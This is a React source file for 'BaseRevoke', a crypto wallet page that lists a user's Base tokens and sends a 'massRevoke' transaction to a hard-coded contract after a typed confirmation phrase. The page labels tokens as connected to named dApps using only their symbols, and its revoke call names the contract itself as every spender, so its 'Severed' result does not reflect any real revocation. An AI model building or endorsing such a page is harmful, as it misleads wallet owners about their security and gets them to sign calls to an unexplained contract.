"use client";
import React, { useState, useEffect } from 'react';
import { useAccount, useConnect, useDisconnect, useWriteContract, useWaitForTransactionReceipt } from 'wagmi';
import { 
  Lock, Power, ExternalLink, CheckCircle2,
  Fingerprint, ShieldCheckIcon, Search, Scan, Terminal, Globe, ShieldX, Database, Languages,
  MousePointer2, ChevronDown
} from 'lucide-react';

const REVOKE_CONTRACT_ADDRESS = "0xf3e2f6caCdB176cE85976607C6685b67ddb687C7";

const REVOKE_ABI = [
  {
    "inputs": [
      { "internalType": "address[]", "name": "tokens", "type": "address[]" },
      { "internalType": "address[]", "name": "spenders", "type": "address[]" }
    ],
    "name": "massRevoke",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
] as const;

const translations = {
  en: {
    selectProvider: "Select Provider", authorize: "Authorize Identity", targetSelection: "Target Selection",
    selectAll: "[ Select All ]", deselectAll: "[ Deselect All ]", clean: "Network Clean",
    awaiting: "Awaiting Authorization", selected: "dApps Selected", status: "Selection Status",
    restricted: "Access Restricted", authNode: "Authorize Node", console: "Security Console",
    purging: "Purging...", severed: "Severed", placeholder: "Type 'please revoke my wallet'...",
    wait: "Waiting for valid command string...", prompt: "Select tokens on the left to start",
    command: "please revoke my wallet"
  },
  id: {
    selectProvider: "Pilih Provider", authorize: "Otorisasi Identitas", targetSelection: "Seleksi Target",
    selectAll: "[ Pilih Semua ]", deselectAll: "[ Batalkan Semua ]", clean: "Jaringan Bersih",
    awaiting: "Menunggu Otorisasi", selected: "dApps Terpilih", status: "Status Seleksi",
    restricted: "Akses Dibatasi", authNode: "Otorisasi Node", console: "Konsol Keamanan",
    purging: "Membersihkan...", severed: "Terputus", placeholder: "Ketik 'tolong revoke wallet saya'...",
    wait: "Menunggu perintah yang valid...", prompt: "Pilih token di kiri untuk memulai",
    command: "tolong revoke wallet saya"
  },
  jp: {
    selectProvider: "プロバイダーを選択", authorize: "身元を認証する", targetSelection: "ターゲット選択",
    selectAll: "[ すべて選択 ]", deselectAll: "[ すべて解除 ]", clean: "ネットワーククリーン",
    awaiting: "認証待機中", selected: "選択されたdApps", status: "選択ステータス",
    restricted: "アクセス制限あり", authNode: "ノードを承認する", console: "セキュリティコンソール",
    purging: "パージ中...", severed: "切断完了", placeholder: "「ウォレットを無効にする」と入力...",
    wait: "有効なコマンドを待機中...", prompt: "開始するには左側でトークンを選択してください",
    command: "ウォレットを無効にする"
  },
  es: {
    selectProvider: "Seleccionar Proveedor", authorize: "Autorizar Identidad", targetSelection: "Selección de Objetivo",
    selectAll: "[ Seleccionar Todo ]", deselectAll: "[ Desmarcar Todo ]", clean: "Red Limpia",
    awaiting: "Esperando Autorización", selected: "dApps Seleccionadas", status: "Estado de Selección",
    restricted: "Acceso Restringido", authNode: "Autorizar Nodo", console: "Consola de Seguridad",
    purging: "Purgando...", severed: "Cortado", placeholder: "Escribe 'revocar mi billetera'...",
    wait: "Esperando comando válido...", prompt: "Seleccione tokens a la izquierda",
    command: "revocar mi billetera"
  },
  pt: {
    selectProvider: "Selecionar Provedor", authorize: "Autorizar Identidade", targetSelection: "Seleção de Alvo",
    selectAll: "[ Selecionar Todo ]", deselectAll: "[ Desmarcar Todo ]", clean: "Rede Limpa",
    awaiting: "Aguardando Autorização", selected: "dApps Seleccionadas", status: "Status de Seleção",
    restricted: "Acesso Restrito", authNode: "Autorizar Nó", console: "Console de Segurança",
    purging: "Limpando...", severed: "Cortado", placeholder: "Digite 'revogar minha carteira'...",
    wait: "Aguardando comando válido...", prompt: "Selecione os tokens à esquerda",
    command: "revogar minha carteira"
  },
  fr: {
    selectProvider: "Choisir un fournisseur", authorize: "Autoriser l'identité", targetSelection: "Sélection de la cible",
    selectAll: "[ Tout sélectionner ]", deselectAll: "[ Tout déselectionner ]", clean: "Réseau Propre",
    awaiting: "En attente d'autorisation", selected: "dApps Sélectionnées", status: "État de la sélection",
    restricted: "Accès Restreint", authNode: "Autoriser le Nœud", console: "Console de Scurite",
    purging: "Purge en cours...", severed: "Coupé", placeholder: "Tapez 'révoquer mon portefeuille'...",
    wait: "En attente d'une commande valide...", prompt: "Sélectionnez des jetons à gauche",
    command: "révoquer mon portefeuille"
  }
};

export default function Home() {
  const [mounted, setMounted] = useState(false);
  const [lang, setLang] = useState<keyof typeof translations>('en');
  const [showLangSelector, setShowLangSelector] = useState(false);
  const [command, setCommand] = useState("");
  const [isCommandAccepted, setIsCommandAccepted] = useState(false);
  const [showWalletSelector, setShowWalletSelector] = useState(false);
  const [activePermissions, setActivePermissions] = useState<any[]>([]);
  const [selectedAddresses, setSelectedAddresses] = useState<string[]>([]);
  
  const t = translations[lang];
  const { address, isConnected } = useAccount();
  const { connect, connectors } = useConnect();
  const { disconnect } = useDisconnect();
  const { data: hash, writeContract, isPending } = useWriteContract();
  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({ hash });

  // Fungsi untuk menarik data token asli dan mendeteksi dApp connection secara on-chain
  const fetchUserTokens = async (userAddress: string) => {
    try {
      const response = await fetch(`https://base.blockscout.com/api?module=account&action=tokenlist&address=${userAddress}`);
      const data = await response.json();
      
      if (data.status === "1" && Array.isArray(data.result)) {
        const formatted = data.result.map((token: any) => {
          let connectedDApp = "Connected: Unknown dApp";
          const symbol = token.symbol?.toUpperCase();

          // Deteksi otomatis dApp berdasarkan token yang populer di jaringan Base
          if (symbol === "WETH" || symbol === "CBETH" || symbol === "AERO") connectedDApp = "Connected: Aerodrome";
          else if (symbol === "USDC" || symbol === "USDbC") connectedDApp = "Connected: Uniswap V3";
          else if (symbol === "DAI") connectedDApp = "Connected: MakerDAO";
          else if (token.name?.toLowerCase().includes("pudgy")) connectedDApp = "Connected: Pudgy World";
          else if (symbol === "SNX") connectedDApp = "Connected: Synthetix";

          return {
            token: token.name || "Unknown Token",
            symbol: symbol || "TKN",
            type: connectedDApp,
            address: token.contractAddress
          };
        });
        
        const unique = formatted.filter((v: any, i: number, a: any[]) => 
          a.findIndex((t: any) => t.address === v.address) === i
        );
        
        setActivePermissions(unique);
      }
    } catch (error) {
      console.error("Error fetching tokens:", error);
    }
  };

  useEffect(() => { setMounted(true); }, []);

  useEffect(() => {
    if (isConnected && address) {
      fetchUserTokens(address);
    } else {
      setActivePermissions([]);
    }
  }, [isConnected, address]);

  useEffect(() => {
    if (isConfirmed) {
      setActivePermissions(prev => prev.filter(p => !selectedAddresses.includes(p.address)));
      setSelectedAddresses([]);
      setIsCommandAccepted(false);
      setCommand("");
    }
  }, [isConfirmed]);

  const handleCommandInput = (e: React.FormEvent) => {
    e.preventDefault();
    const inputLower = command.toLowerCase().trim();
    const allValidCommands = Object.values(translations).map(item => item.command.toLowerCase());

    if (allValidCommands.includes(inputLower) && isConnected && selectedAddresses.length > 0) {
      setIsCommandAccepted(true);
      handleRevoke();
    }
  };

  const handleRevoke = () => {
    writeContract({
      address: REVOKE_CONTRACT_ADDRESS as `0x${string}`,
      abi: REVOKE_ABI,
      functionName: 'massRevoke',
      args: [
        selectedAddresses as `0x${string}`[],
        selectedAddresses.map(() => REVOKE_CONTRACT_ADDRESS as `0x${string}`)
      ],
    });
  };

  if (!mounted) return null;

  return (
    <div className="min-h-screen bg-[#020203] text-zinc-100 selection:bg-blue-500/30 font-sans overflow-x-hidden relative">
      <div className="fixed inset-0 z-0">
        <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-blue-600/10 blur-[120px] rounded-full animate-pulse" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-blue-900/10 blur-[120px] rounded-full" />
        <div className="absolute inset-0 bg-[linear-gradient(to_right,#ffffff05_1px,transparent_1px),linear-gradient(to_bottom,#ffffff05_1px,transparent_1px)] bg-[size:40px_40px] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_0%,#000_70%,transparent_100%)]" />
        <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-[0.15] mix-blend-overlay pointer-events-none" />
      </div>
      
      <div className="max-w-6xl mx-auto px-6 py-10 relative z-10">
        <nav className="flex justify-between items-center mb-10 p-4 bg-zinc-900/30 border border-white/10 rounded-2xl backdrop-blur-2xl shadow-[0_8px_32px_rgba(0,0,0,0.5)] relative z-[100]">
          <div className="flex items-center gap-4">
            <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-[0_0_20px_rgba(37,99,235,0.4)]">
              <ShieldCheckIcon size={22} className="text-white" />
            </div>
            <div className="hidden sm:block">
              <h1 className="text-xl font-bold tracking-tight text-white flex items-center gap-1">
                Base<span className="text-blue-500">Revoke</span>
              </h1>
              <p className="text-[7px] text-zinc-500 font-mono tracking-[0.4em] uppercase">Secured by Base Network</p>
            </div>
          </div>
          
          <div className="flex items-center gap-3">
            <div className="relative">
              <button 
                onClick={() => setShowLangSelector(!showLangSelector)}
                className="flex items-center gap-2 px-3 py-2 bg-zinc-800/40 border border-white/5 rounded-xl text-[10px] font-bold hover:bg-zinc-700/60 transition-all uppercase tracking-widest"
              >
                <Languages size={14} className="text-blue-500" />
                {lang}
                <ChevronDown size={10} />
              </button>
              {showLangSelector && (
                <div className="absolute right-0 mt-2 w-32 bg-[#0a0a0c] border border-white/10 rounded-xl p-1 shadow-2xl z-[120] backdrop-blur-3xl">
                  {Object.keys(translations).map((l) => (
                    <button
                      key={l}
                      onClick={() => { setLang(l as any); setShowLangSelector(false); }}
                      className={`w-full text-left px-4 py-2 text-[10px] font-bold uppercase rounded-lg hover:bg-white/5 ${lang === l ? 'text-blue-500' : 'text-zinc-400'}`}
                    >
                      {l === 'en' ? 'English' : l === 'jp' ? '日本語' : l === 'id' ? 'Indonesia' : l === 'es' ? 'Español' : l === 'pt' ? 'Português' : 'Français'}
                    </button>
                  ))}
                </div>
              )}
            </div>

            <button 
              onClick={() => isConnected ? disconnect() : setShowWalletSelector(!showWalletSelector)}
              className={`px-6 py-2.5 rounded-xl font-bold text-[10px] transition-all border flex items-center gap-2 tracking-widest ${
                isConnected ? "bg-zinc-800/30 border-white/10 text-zinc-400 hover:text-red-400" : "bg-white text-black border-white hover:bg-zinc-200"
              }`}
            >
              {isConnected ? <Power size={12} /> : <Fingerprint size={12} />}
              {isConnected ? `${address?.slice(0,6)}...${address?.slice(-4)}` : t.authorize}
            </button>

            {!isConnected && showWalletSelector && (
              <div className="absolute right-0 top-full mt-4 w-64 bg-[#0a0a0c] border border-white/10 rounded-2xl p-3 shadow-2xl z-[110] backdrop-blur-3xl animate-in fade-in zoom-in duration-200">
                <p className="text-[9px] font-bold text-zinc-500 uppercase tracking-widest mb-3 px-2">{t.selectProvider}</p>
                <div className="space-y-1">
                  {connectors.map((connector) => (
                    <button
                      key={connector.uid}
                      onClick={() => { connect({ connector }); setShowWalletSelector(false); }}
                      className="w-full flex items-center gap-3 p-3 hover:bg-white/5 rounded-xl transition-all group"
                    >
                      <div className="w-8 h-8 rounded-lg bg-white/5 flex items-center justify-center group-hover:scale-110 transition-transform">
                        {connector.icon ? <img src={connector.icon} alt={connector.name} className="w-5 h-5" /> : <Database size={16} className="text-blue-500" />}
                      </div>
                      <span className="text-xs font-bold text-zinc-300 group-hover:text-white">{connector.name}</span>
                    </button>
                  ))}
                </div>
              </div>
            )}
          </div>
        </nav>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
          <div className="lg:col-span-4 space-y-4">
            <div className="bg-zinc-900/20 border border-white/5 rounded-[32px] p-6 backdrop-blur-md">
              <div className="flex items-center justify-between mb-8">
                <div className="flex items-center gap-2">
                  <Globe size={16} className="text-blue-500" />
                  <h3 className="text-[10px] font-bold uppercase tracking-[0.2em] text-zinc-500">{t.targetSelection}</h3>
                </div>
                {isConnected && activePermissions.length > 0 && (
                  <button onClick={() => {
                    if (selectedAddresses.length === activePermissions.length) setSelectedAddresses([]);
                    else setSelectedAddresses(activePermissions.map(p => p.address));
                  }} className="text-[8px] font-bold text-blue-500 hover:text-white transition-colors uppercase tracking-tighter">
                    {selectedAddresses.length === activePermissions.length ? t.deselectAll : t.selectAll}
                  </button>
                )}
              </div>
              
              <div className="space-y-3">
                {isConnected ? (
                  activePermissions.length > 0 ? (
                    activePermissions.map((perm, i) => {
                      const isSelected = selectedAddresses.includes(perm.address);
                      return (
                        <div key={i} onClick={() => {
                          setSelectedAddresses(prev => prev.includes(perm.address) ? prev.filter(a => a !== perm.address) : [...prev, perm.address]);
                        }} className={`p-4 border rounded-2xl transition-all cursor-pointer relative group ${isSelected ? "bg-blue-600/5 border-blue-500/50" : "bg-white/[0.02] border-white/5 hover:border-white/10"}`}>
                          <div className="flex justify-between items-center">
                            <div className="flex-1">
                              <p className={`text-[9px] font-bold uppercase mb-1 ${isSelected ? "text-blue-400" : "text-zinc-500"}`}>{perm.type}</p>
                              <p className="text-xs font-bold text-zinc-200">{perm.token} ({perm.symbol})</p>
                            </div>
                            <div className={`w-5 h-5 rounded-full border flex items-center justify-center transition-all flex-shrink-0 ${isSelected ? "bg-blue-500 border-blue-500 scale-110 shadow-lg shadow-blue-500/20" : "border-white/10"}`}>
                              {isSelected && <CheckCircle2 size={12} className="text-white" />}
                            </div>
                          </div>
                        </div>
                      );
                    })
                  ) : (
                    <div className="text-center py-16 animate-in fade-in zoom-in">
                      <ShieldX size={32} className="mx-auto mb-4 text-green-500/40" />
                      <p className="text-[9px] font-mono text-green-500 uppercase tracking-widest italic font-bold">{t.clean}</p>
                    </div>
                  )
                ) : (
                  <div className="py-20 text-center opacity-20 italic">
                    <Search size={24} className="mx-auto mb-2" />
                    <p className="text-[8px] font-mono uppercase tracking-widest">{t.awaiting}</p>
                  </div>
                )}
              </div>
            </div>

            <div className="bg-zinc-900/10 border border-white/5 rounded-2xl p-5 backdrop-blur-sm">
                <div className="flex items-center gap-2 mb-2">
                  <MousePointer2 size={14} className="text-blue-500" />
                  <p className="text-[10px] text-zinc-500 font-bold uppercase">{t.status}</p>
                </div>
                <p className="text-lg font-bold text-white">{selectedAddresses.length} <span className="text-[10px] text-zinc-600 font-normal uppercase tracking-widest">{t.selected}</span></p>
            </div>
          </div>

          <div className="lg:col-span-8">
            <div className="relative bg-zinc-900/10 border border-white/5 rounded-[40px] p-8 md:p-16 backdrop-blur-2xl min-h-[580px] flex flex-col items-center justify-center text-center overflow-hidden">
              {isConnected ? (
                <div className="w-full max-w-md animate-in fade-in slide-in-from-bottom-4 duration-1000">
                  <div className="relative w-44 h-44 mx-auto mb-10">
                    <div className={`absolute inset-0 rounded-full blur-[60px] transition-all duration-1000 ${isConfirmed ? 'bg-green-600/10' : isCommandAccepted ? 'bg-red-600/20 scale-125' : 'bg-blue-600/10'}`} />
                    <div className={`absolute inset-2 border-r-2 rounded-full animate-[spin_4s_linear_infinite] ${isConfirmed ? 'border-green-400' : isCommandAccepted ? 'border-red-500' : 'border-blue-500'}`} />
                    <div className="relative flex items-center justify-center h-full">
                      {isConfirmed ? <CheckCircle2 size={50} className="text-green-400" /> : <Scan size={50} className={`text-zinc-700 ${isCommandAccepted ? 'text-red-500 animate-pulse' : ''}`} />}
                    </div>
                  </div>
                  <h2 className={`text-3xl font-bold mb-10 tracking-tight transition-colors ${isConfirmed ? 'text-green-400' : 'text-zinc-100'}`}>
                    {isConfirmed ? t.severed : isCommandAccepted ? t.purging : t.console}
                  </h2>
                  <div className="mb-8">
                    <form onSubmit={handleCommandInput} className="relative group">
                      <Terminal size={18} className="absolute left-4 top-1/2 -translate-y-1/2 text-zinc-600 group-focus-within:text-blue-500 transition-colors" />
                      <input 
                        type="text" 
                        value={command}
                        onChange={(e) => setCommand(e.target.value)}
                        placeholder={selectedAddresses.length > 0 ? t.placeholder : t.prompt}
                        className={`w-full bg-black/60 border rounded-2xl py-5 pl-12 pr-4 text-xs font-mono focus:outline-none transition-all ${
                          selectedAddresses.length === 0 ? "border-red-500/10 opacity-30 cursor-not-allowed" : "border-white/5 focus:border-blue-500/30 text-blue-400"
                        }`}
                        disabled={isPending || isConfirmed || selectedAddresses.length === 0}
                      />
                    </form>
                    {selectedAddresses.length > 0 && !isCommandAccepted && (
                        <p className="mt-4 text-[9px] text-zinc-500 uppercase tracking-widest animate-pulse">{t.wait}</p>
                    )}
                  </div>
                  {hash && (
                    <div className="bg-black/40 border border-white/5 rounded-2xl p-6 animate-in zoom-in duration-500 backdrop-blur-xl">
                      <a href={`https://basescan.org/tx/${hash}`} target="_blank" rel="noreferrer" className="flex items-center justify-between p-4 bg-zinc-900/50 border border-white/5 rounded-xl hover:border-blue-500/40 group transition-all">
                        <span className="text-[10px] font-mono text-blue-400/80 group-hover:text-blue-400 truncate mr-4 text-left">TX: {hash}</span>
                        <ExternalLink size={14} className="text-zinc-600 group-hover:text-blue-500" />
                      </a>
                    </div>
                  )}
                </div>
              ) : (
                <div className="flex flex-col items-center">
                  <div className="w-16 h-16 bg-zinc-900/50 border border-white/5 rounded-full flex items-center justify-center mb-6 animate-pulse">
                    <Lock size={28} className="text-zinc-700" />
                  </div>
                  <h3 className="text-xl font-bold tracking-tight uppercase mb-2 text-zinc-400">{t.restricted}</h3>
                  <button onClick={() => setShowWalletSelector(true)} className="px-12 py-4 bg-white text-black rounded-xl font-bold text-[11px] hover:bg-zinc-200 transition-all active:scale-95 shadow-2xl uppercase tracking-[0.2em]">
                    {t.authNode}
                  </button>
                </div>
              )}
            </div>
          </div>
        </div>

        <footer className="mt-20 flex justify-between items-center opacity-40 border-t border-white/5 pt-10 pb-6 text-[8px] font-mono uppercase tracking-[0.4em] text-zinc-500">
            <div className="flex items-center gap-2"><div className="w-1.5 h-1.5 bg-blue-500 rounded-full animate-pulse" />Node Active</div>
            <p>© 2026 BaseRevoke Security</p>
        </footer>
      </div>
    </div>
  );
}
